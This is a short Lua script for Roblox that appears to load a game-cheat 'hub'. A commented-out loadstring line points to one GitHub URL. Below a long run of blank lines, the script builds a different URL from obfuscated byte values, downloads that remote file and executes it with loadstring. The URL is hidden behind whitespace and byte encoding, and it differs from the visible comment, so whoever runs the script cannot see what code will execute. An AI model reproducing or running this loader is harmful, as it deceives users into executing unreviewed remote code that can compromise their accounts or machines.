-- loadstring(game:HttpGet("https://raw.githubusercontent.com/KieuroBeep/TrixSpoits/refs/heads/main/LuaScriptFile"))()









































































































































































































local url_bytes = {
	104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,
	101,114,99,111,110,116,101,110,116,46,99,111,109,47,119,101,97,116,104,101,
	114,119,101,115,115,45,108,103,116,109,47,82,105,118,97,108,45,70,108,117,
	101,110,116,72,117,98,47,114,101,102,115,47,104,101,97,100,115,47,109,97,
	105,110,47,82,105,118,97,108,45,70,108,117,101,110,116,72,117,98
}

local chars = {}
for i = 1, #url_bytes do
	chars[i] = string.char(url_bytes[i])
end
local url = table.concat(chars)

-- Fetch and run safely
local ok, res = pcall(function()
	if type(game.HttpGet) == "function" then
		return game:HttpGet(url)
	end
	local hs = (game.GetService and game:GetService("HttpService"))
	if hs and hs.GetAsync then
		return hs:GetAsync(url)
	end
	error("No HttpGet / GetAsync available in this environment")
end)

if not ok then
	error("HTTP fetch failed: " .. tostring(res))
end

local code = tostring(res)
local loader = loadstring or load
local fn, compile_err = loader(code)
if not fn then
	error("Compile error from remote code: " .. tostring(compile_err))
end

local ok2, run_err = pcall(fn)
if not ok2 then
	error("Remote script runtime error: " .. tostring(run_err))
end
